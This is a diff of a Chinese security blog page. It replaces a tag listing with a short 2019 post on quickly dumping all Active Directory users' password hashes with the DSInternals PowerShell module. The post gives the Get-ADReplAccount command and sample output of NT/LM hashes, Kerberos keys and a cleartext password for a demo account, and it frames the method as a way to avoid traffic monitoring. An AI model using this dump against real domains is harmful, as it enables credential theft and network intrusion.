@@ -82,7 +82,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="KillLan,安全博客,黑客网站,黑客技术,黑客工具,信息安全,web安全,网络安全,系统安全,漏洞利用,渗透测试工具,内网渗透,局域网攻击,社会工程学,黑客社工">
+  <meta name="keywords" content="域HASH,NTLMHASH,内网渗透,DSInternals,">
 
 
 
@@ -98,16 +98,20 @@
 
 
 
-<meta name="description" content="KillLan是一个研究内网的奇特技巧渗透与内网安全防御博客,发布最新互联网漏洞利用方法与网络技术问题解决。分享最新安全技术文章及翻译国外最新安全技术文章。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="KillLan&#39;sBlog">
-<meta property="og:url" content="http://www.killlan.com/tags/防火墙/index.html">
+<meta name="description" content="简述我们都知道域NTDS.dit文件域用户越多文件越大,我见过的ntds文件起码以G为单位,把ntds大文件拉回到本地实属不便,并且易被流量监控设备发觉 DSInternals使用方法1、PowerShell 5.0： Install-Module DSInternals2、PowerShell 3.0、4.0解压压缩包cd C:\test\DSInternalsImport-Module .\D">
+<meta name="keywords" content="域HASH,NTLMHASH,内网渗透,DSInternals">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Powershell快速导出域HASH(DSInternals)">
+<meta property="og:url" content="http://www.killlan.com/2019/08/31/powershell-dsinternals-ntlm/index.html">
 <meta property="og:site_name" content="KillLan&#39;sBlog">
-<meta property="og:description" content="KillLan是一个研究内网的奇特技巧渗透与内网安全防御博客,发布最新互联网漏洞利用方法与网络技术问题解决。分享最新安全技术文章及翻译国外最新安全技术文章。">
+<meta property="og:description" content="简述我们都知道域NTDS.dit文件域用户越多文件越大,我见过的ntds文件起码以G为单位,把ntds大文件拉回到本地实属不便,并且易被流量监控设备发觉 DSInternals使用方法1、PowerShell 5.0： Install-Module DSInternals2、PowerShell 3.0、4.0解压压缩包cd C:\test\DSInternalsImport-Module .\D">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://cdn.killlan.com/20190831202038-201983120216.png">
+<meta property="og:updated_time" content="2019-08-31T12:32:52.325Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="KillLan&#39;sBlog">
-<meta name="twitter:description" content="KillLan是一个研究内网的奇特技巧渗透与内网安全防御博客,发布最新互联网漏洞利用方法与网络技术问题解决。分享最新安全技术文章及翻译国外最新安全技术文章。">
+<meta name="twitter:title" content="Powershell快速导出域HASH(DSInternals)">
+<meta name="twitter:description" content="简述我们都知道域NTDS.dit文件域用户越多文件越大,我见过的ntds文件起码以G为单位,把ntds大文件拉回到本地实属不便,并且易被流量监控设备发觉 DSInternals使用方法1、PowerShell 5.0： Install-Module DSInternals2、PowerShell 3.0、4.0解压压缩包cd C:\test\DSInternalsImport-Module .\D">
+<meta name="twitter:image" content="http://cdn.killlan.com/20190831202038-201983120216.png">
 
 
 
@@ -136,13 +140,13 @@
 
 
 
-  <link rel="canonical" href="http://www.killlan.com/tags/防火墙/">
+  <link rel="canonical" href="http://www.killlan.com/2019/08/31/powershell-dsinternals-ntlm/">
 
 
 
 
 
-  <title>标签: 防火墙 | KillLan'sBlog</title>
+  <title>Powershell快速导出域HASH(DSInternals) | KillLan'sBlog</title>
   
 
 
@@ -183,7 +187,7 @@
     
   
 
-  <div class="container sidebar-position-right  ">
+  <div class="container sidebar-position-right page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -309,52 +313,203 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>防火墙<small>标签</small>
-        </h2>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.killlan.com/2019/08/31/powershell-dsinternals-ntlm/">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="KillRootKit">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KillLan'sBlog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2017/09/16/Nmap-Chinese-Course/" itemprop="url">
-              
-                <span itemprop="name">Nmap 中文教程</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">Powershell快速导出域HASH(DSInternals)</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2017-09-16T02:39:20+08:00" content="2017-09-16">
-          09-16
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-31T19:16:39+08:00">
+                2019-08-31
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/08/31/powershell-dsinternals-ntlm/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/31/powershell-dsinternals-ntlm/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/08/31/powershell-dsinternals-ntlm/" class="leancloud_visitors" data-flag-title="Powershell快速导出域HASH(DSInternals)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>我们都知道域NTDS.dit文件域用户越多文件越大,我见过的ntds文件起码以G为单位,把ntds大文件拉回到本地实属不便,并且易被流量监控设备发觉</p>
+<h1 id="DSInternals使用方法"><a href="#DSInternals使用方法" class="headerlink" title="DSInternals使用方法"></a>DSInternals使用方法</h1><p>1、PowerShell 5.0：</p>
+<p>Install-Module DSInternals<br>2、PowerShell 3.0、4.0<br>解压压缩包<br>cd C:\test\DSInternals<br>Import-Module .\DSInternals</p>
+<p>导出所有域用户HASH</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-ADReplAccount -<span class="keyword">All</span> -NamingContext <span class="string">'DC=Adatum,DC=com'</span> -Server LON-DC1</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cdn.killlan.com/20190831202038-201983120216.png" alt="示例图"><br>如上图过W+用户,ntds文件绝壁超过G,导出域hash才200左右MB<br>该工具有许多模块,需要自行官网查看</p>
+<p>输出内容:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">DistinguishedName:</span> <span class="string">CN=April</span> <span class="string">Reagan,OU=IT,DC=Adatum,DC=com</span></span><br><span class="line"><span class="attr">Sid:</span> <span class="string">S-1-5-21-3180365339-800773672-3767752645-1375</span></span><br><span class="line"><span class="attr">Guid:</span> <span class="number">124</span><span class="string">ae098-699b-4450-a47a-314a29cc90ea</span></span><br><span class="line"><span class="attr">SamAccountName:</span> <span class="string">April</span></span><br><span class="line"><span class="attr">SamAccountType:</span> <span class="string">User</span></span><br><span class="line"><span class="attr">UserPrincipalName:</span> <span class="string">April@adatum.com</span></span><br><span class="line"><span class="attr">PrimaryGroupId:</span> <span class="number">513</span></span><br><span class="line"><span class="attr">SidHistory:</span> </span><br><span class="line"><span class="attr">Enabled:</span> <span class="literal">True</span></span><br><span class="line"><span class="attr">Deleted:</span> <span class="literal">False</span></span><br><span class="line"><span class="attr">LastLogon:</span> </span><br><span class="line"><span class="attr">DisplayName:</span> <span class="string">April</span> <span class="string">Reagan</span></span><br><span class="line"><span class="attr">GivenName:</span> <span class="string">April</span></span><br><span class="line"><span class="attr">Surname:</span> <span class="string">Reagan</span></span><br><span class="line"><span class="attr">Description:</span> </span><br><span class="line"><span class="attr">NTHash:</span> <span class="number">92937945</span><span class="string">b518814341de3f726500d4ff</span></span><br><span class="line"><span class="attr">LMHash:</span> <span class="number">727e3576618</span><span class="string">fa1754a3b108f3fa6cb6d</span></span><br><span class="line"><span class="attr">NTHashHistory:</span> </span><br><span class="line">  <span class="string">Hash</span> <span class="number">01</span><span class="string">:</span> <span class="number">92937945</span><span class="string">b518814341de3f726500d4ff</span></span><br><span class="line">  <span class="string">Hash</span> <span class="number">02</span><span class="string">:</span> <span class="number">1</span><span class="string">d3da193d2f45911a6f0fa940b9fb32f</span></span><br><span class="line">  <span class="string">Hash</span> <span class="number">03</span><span class="string">:</span> <span class="number">402</span><span class="string">bc59d8a00641b7f386e78596340f4</span></span><br><span class="line"><span class="attr">LMHashHistory:</span> </span><br><span class="line">  <span class="string">Hash</span> <span class="number">01</span><span class="string">:</span> <span class="number">727e3576618</span><span class="string">fa1754a3b108f3fa6cb6d</span></span><br><span class="line">  <span class="string">Hash</span> <span class="number">02</span><span class="string">:</span> <span class="number">5</span><span class="string">a5503d0e85f58abaad3b435b51404ee</span></span><br><span class="line">  <span class="string">Hash</span> <span class="number">03</span><span class="string">:</span> <span class="string">f9393d97e7a1873caad3b435b51404ee</span></span><br><span class="line"><span class="attr">SupplementalCredentials:</span></span><br><span class="line"><span class="attr">  ClearText:</span> <span class="string">Pa$$w0rd</span></span><br><span class="line"><span class="attr">  Kerberos:</span></span><br><span class="line"><span class="attr">    Credentials:</span></span><br><span class="line">      <span class="string">DES_CBC_MD5</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">76</span><span class="string">fe3b5bda911a40</span></span><br><span class="line"><span class="attr">    OldCredentials:</span></span><br><span class="line">      <span class="string">DES_CBC_MD5</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">7</span><span class="string">f8c4f38e0ea0b80</span></span><br><span class="line"><span class="attr">    Salt:</span> <span class="string">ADATUM.COMApril</span></span><br><span class="line"><span class="attr">    Flags:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">  KerberosNew:</span></span><br><span class="line"><span class="attr">    Credentials:</span></span><br><span class="line">      <span class="string">AES256_CTS_HMAC_SHA1_96</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">3</span><span class="string">a3b6a89bb82d112db5ef68f6db5d1afc2b806df61dcd85e3eacf3b85ee382d8</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line">      <span class="string">AES128_CTS_HMAC_SHA1_96</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="string">a72c8bc96c4a6f03244f0b0067a1e440</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line">      <span class="string">DES_CBC_MD5</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">76</span><span class="string">fe3b5bda911a40</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line"><span class="attr">    OldCredentials:</span></span><br><span class="line">      <span class="string">AES256_CTS_HMAC_SHA1_96</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">14e46244</span><span class="string">a59a37cd8aa7c1fe61896441c7d065fafe4874191e69c1fe28856810</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line">      <span class="string">AES128_CTS_HMAC_SHA1_96</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">034</span><span class="string">b512ec64286dec951d6aff8d81fa8</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line">      <span class="string">DES_CBC_MD5</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">7</span><span class="string">f8c4f38e0ea0b80</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line"><span class="attr">    OlderCredentials:</span></span><br><span class="line">      <span class="string">AES256_CTS_HMAC_SHA1_96</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">2387</span><span class="string">ca8f936c8c154996809af8fee7c47fe4b9b5dd84d051fc43a9289bbaa3ab</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line">      <span class="string">AES128_CTS_HMAC_SHA1_96</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">29</span><span class="string">d536ec057f9063747161429b81f056</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line">      <span class="string">DES_CBC_MD5</span></span><br><span class="line"><span class="attr">        Key:</span> <span class="number">58</span><span class="string">f1cbe6e50e1f83</span></span><br><span class="line"><span class="attr">        Iterations:</span> <span class="number">4096</span></span><br><span class="line"><span class="attr">    ServiceCredentials:</span></span><br><span class="line"><span class="attr">    Salt:</span> <span class="string">ADATUM.COMApril</span></span><br><span class="line"><span class="attr">    DefaultIterationCount:</span> <span class="number">4096</span></span><br><span class="line"><span class="attr">    Flags:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">  WDigest:</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">01</span><span class="string">:</span> <span class="string">c3d012ab1101eb8f51b483fb4c5f8a7e</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">02</span><span class="string">:</span> <span class="string">c993da396914645b356ae7816251fcb1</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">03</span><span class="string">:</span> <span class="number">6</span><span class="string">b58530cab34de91189a603e22c2be15</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">04</span><span class="string">:</span> <span class="string">c3d012ab1101eb8f51b483fb4c5f8a7e</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">05</span><span class="string">:</span> <span class="number">5</span><span class="string">a762cf59fa31023dcba1ebd4725b443</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">06</span><span class="string">:</span> <span class="string">c78bac91c0ba25cae5d44460fd65a73b</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">07</span><span class="string">:</span> <span class="number">59</span><span class="string">d73cea16afd1aac6bf8acfa2768621</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">08</span><span class="string">:</span> <span class="string">d2be383db9469a39736d9e2136054131</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">09</span><span class="string">:</span> <span class="number">079</span><span class="string">de9f4d94d97a80f1726497dfd1cc2</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">10</span><span class="string">:</span> <span class="number">85</span><span class="string">dbe1549d5fbfcc91f7fe5ac5910f52</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">11</span><span class="string">:</span> <span class="number">961</span><span class="string">a36bded5535b8fc15b4b8e6c48b93</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">12</span><span class="string">:</span> <span class="number">6</span><span class="string">ac8a60d83e9ae67c2097db716a6af17</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">13</span><span class="string">:</span> <span class="string">e899e577d5f81ef5288ab67de07fad9a</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">14</span><span class="string">:</span> <span class="number">135452</span><span class="string">ab86d40c3d47ca849646d5e176</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">15</span><span class="string">:</span> <span class="string">a84c367eaa334d0a4cb98e36da011e0f</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">16</span><span class="string">:</span> <span class="number">61</span><span class="string">a458eb70440b1a92639452f0c2c948</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">17</span><span class="string">:</span> <span class="number">238</span><span class="string">f4059776c3575be534afb46be4ccf</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">18</span><span class="string">:</span> <span class="number">03</span><span class="string">ddf370064c544e9c6dbb6ccbf8f4ac</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">19</span><span class="string">:</span> <span class="number">354</span><span class="string">dd6c77ccf35f63e48cd5af6473ccf</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">20</span><span class="string">:</span> <span class="number">5</span><span class="string">f9800d734ebe9fb588def6aaafc40b7</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">21</span><span class="string">:</span> <span class="number">59</span><span class="string">aab99ebcddcbf13b96d75bb7a731e3</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">22</span><span class="string">:</span> <span class="string">f1685383b0c131035ae264ee5bd24a8d</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">23</span><span class="string">:</span> <span class="number">3119e42886</span><span class="string">b01cad00347e72d0cee594</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">24</span><span class="string">:</span> <span class="string">ebef7f2c730e17ded8cba1ed20122602</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">25</span><span class="string">:</span> <span class="number">7</span><span class="string">d99673c9895e0b9c484e430578ee78e</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">26</span><span class="string">:</span> <span class="string">e1e20982753c6a1140c1a8241b23b9ea</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">27</span><span class="string">:</span> <span class="string">e5ec1c63e0e549e49cda218bc3752051</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">28</span><span class="string">:</span> <span class="number">26</span><span class="string">f2d85f7513d73dd93ab3afd2d90cf6</span></span><br><span class="line">    <span class="string">Hash</span> <span class="number">29</span><span class="string">:</span> <span class="number">84010</span><span class="string">d657e6b58ce233fae2bd7644222</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
+<li><a href="https://www.dsinternals.com/en/list-of-cmdlets-in-the-dsinternals-module/" rel="external nofollow noopener noreferrer" target="_blank">DSInternals</a></li>
+<li><a href="https://blog.csdn.net/zvall/article/details/50113133" rel="external nofollow noopener noreferrer" target="_blank">利用Powershell快速导出域控所有用户Hash</a></li>
+</ul>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/域HASH-NTLMHASH-内网渗透-DSInternals/" rel="tag"># 域HASH,NTLMHASH,内网渗透,DSInternals</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/18/microsoft-Input-English-Becomebigger/" rel="next" title="微软输入法英文变大空格修复办法">
+                <i class="fa fa-chevron-left"></i> 微软输入法英文变大空格修复办法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -362,6 +517,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer" target="_blank">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -382,8 +548,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="KillRootKit">
           <p class="site-author-name" itemprop="name">KillRootKit</p>
@@ -481,6 +656,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简述"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DSInternals使用方法"><span class="nav-number">2.</span> <span class="nav-text">DSInternals使用方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -603,10 +794,10 @@
   
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
@@ -624,6 +815,18 @@
       <script id="dsq-count-scr" src="https://killlan.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://www.killlan.com/2019/08/31/powershell-dsinternals-ntlm/';
+          this.page.identifier = '2019/08/31/powershell-dsinternals-ntlm/';
+          this.page.title = 'Powershell快速导出域HASH(DSInternals)';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://killlan.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
